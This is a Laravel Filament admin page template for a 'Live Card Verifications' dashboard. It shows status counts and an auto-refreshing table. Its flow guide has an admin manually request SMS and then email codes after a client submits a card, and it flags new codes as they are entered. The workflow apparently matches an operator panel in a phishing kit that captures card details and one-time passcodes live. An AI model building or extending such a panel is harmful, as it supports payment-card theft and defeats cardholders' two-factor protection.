<x-filament-panels::page>
    <div class="space-y-6">
        {{-- Status Overview Cards --}}
        <div class="grid grid-cols-1 md:grid-cols-5 gap-4">
            <x-filament::section>
                <div class="text-center">
                    <div class="text-3xl font-bold text-gray-500">
                        {{ \App\Models\CardVerification::where('status', 'pending')->count() }}
                    </div>
                    <div class="text-xs text-gray-400 mt-1">Pending</div>
                </div>
            </x-filament::section>
            <x-filament::section>
                <div class="text-center">
                    <div class="text-3xl font-bold text-warning-500">
                        {{ \App\Models\CardVerification::whereIn('status', ['awaiting_sms', 'awaiting_email'])->count() }}
                    </div>
                    <div class="text-xs text-gray-400 mt-1">Awaiting Code</div>
                </div>
            </x-filament::section>
            <x-filament::section>
                <div class="text-center">
                    <div class="text-3xl font-bold text-info-500">
                        {{ \App\Models\CardVerification::whereIn('status', ['sms_code_entered', 'email_code_entered'])->count() }}
                    </div>
                    <div class="text-xs text-gray-400 mt-1">
                        <span class="inline-flex items-center gap-1">
                            <span class="h-2 w-2 rounded-full bg-blue-500 animate-pulse"></span>
                            Code Entered
                        </span>
                    </div>
                </div>
            </x-filament::section>
            <x-filament::section>
                <div class="text-center">
                    <div class="text-3xl font-bold text-success-500">
                        {{ \App\Models\CardVerification::where('status', 'verified')->count() }}
                    </div>
                    <div class="text-xs text-gray-400 mt-1">Verified</div>
                </div>
            </x-filament::section>
            <x-filament::section>
                <div class="text-center">
                    <div class="text-3xl font-bold text-danger-500">
                        {{ \App\Models\CardVerification::where('status', 'failed')->count() }}
                    </div>
                    <div class="text-xs text-gray-400 mt-1">Failed</div>
                </div>
            </x-filament::section>
        </div>

        {{-- Live Feed --}}
        <x-filament::section>
            <x-slot name="heading">
                <div class="flex items-center gap-2">
                    <div class="h-3 w-3 rounded-full bg-green-500 animate-pulse"></div>
                    Live Card Verifications
                    <span class="text-xs font-normal text-gray-400">(auto-refreshes every 3s)</span>
                </div>
            </x-slot>
            <x-slot name="description">
                Manage card verification flow: Submit → SMS Code → Email Code → Verified
            </x-slot>
            {{ $this->table }}
        </x-filament::section>

        {{-- Flow Legend --}}
        <x-filament::section collapsible collapsed>
            <x-slot name="heading">Verification Flow Guide</x-slot>
            <div class="flex flex-wrap gap-2 text-xs">
                <span class="px-2 py-1 rounded bg-gray-100 text-gray-600">1. Client submits card</span>
                <span>→</span>
                <span class="px-2 py-1 rounded bg-yellow-100 text-yellow-700">2. Admin requests SMS</span>
                <span>→</span>
                <span class="px-2 py-1 rounded bg-blue-100 text-blue-700">3. Client enters SMS code</span>
                <span>→</span>
                <span class="px-2 py-1 rounded bg-green-100 text-green-700">4. Admin confirms SMS</span>
                <span>→</span>
                <span class="px-2 py-1 rounded bg-yellow-100 text-yellow-700">5. Admin requests Email</span>
                <span>→</span>
                <span class="px-2 py-1 rounded bg-blue-100 text-blue-700">6. Client enters Email code</span>
                <span>→</span>
                <span class="px-2 py-1 rounded bg-green-100 text-green-700">7. Admin confirms Email</span>
                <span>→</span>
                <span class="px-2 py-1 rounded bg-emerald-100 text-emerald-700 font-bold">8. ✓ Verified</span>
            </div>
        </x-filament::section>
    </div>
</x-filament-panels::page>
